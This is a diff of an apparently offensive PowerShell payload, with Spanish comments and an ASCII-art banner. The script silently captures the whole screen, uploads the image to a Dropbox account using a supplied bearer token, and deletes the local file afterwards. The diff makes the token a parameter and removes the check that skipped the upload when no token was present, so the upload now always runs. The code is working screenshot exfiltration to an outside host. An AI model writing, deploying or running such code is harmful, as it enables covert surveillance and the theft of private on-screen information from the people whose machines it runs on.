@@ -6,9 +6,9 @@
 #  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                        # 
 #   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/                          # 
  #########################################################################################################################           
-
-$folderName = "$env:temp\Screenshot_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss')"
-$filePath = "$folderName\screenshot.png"
+param (
+    [string]$Token
+)
 
 # Función para subir un archivo a Dropbox
 function DropBox-Upload {
@@ -18,7 +18,7 @@ function DropBox-Upload {
     $outputFile = Split-Path $SourceFilePath -leaf
     $TargetFilePath = "/$outputFile"
     $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-    $authorization = "Bearer " + $db
+    $authorization = "Bearer " + $Token
     $headers = @{
         "Authorization" = $authorization
         "Dropbox-API-Arg" = $arg
@@ -34,17 +34,15 @@ $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
 $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
 $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
 
-# Guardar la captura de pantalla en un archivo
-New-Item -Path $folderName -ItemType Directory -Force | Out-Null
+# Guardar la captura de pantalla en un archivo temporal
+$filePath = "$env:TEMP\sc.png"
 $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
 $graphics.Dispose()
 $bitmap.Dispose()
 
 # Subir la captura de pantalla a Dropbox
-if (-not ([string]::IsNullOrEmpty($db))) {
-    DropBox-Upload -SourceFilePath $filePath
-}
+DropBox-Upload -SourceFilePath $filePath
 
-# Eliminar el archivo y directorio temporal
-Remove-Item -Path $filePath -Force
-Remove-Item -Path $folderName -Recurse -Force
+# Eliminar el archivo temporal
+Remove-Item -Path $filePath
+
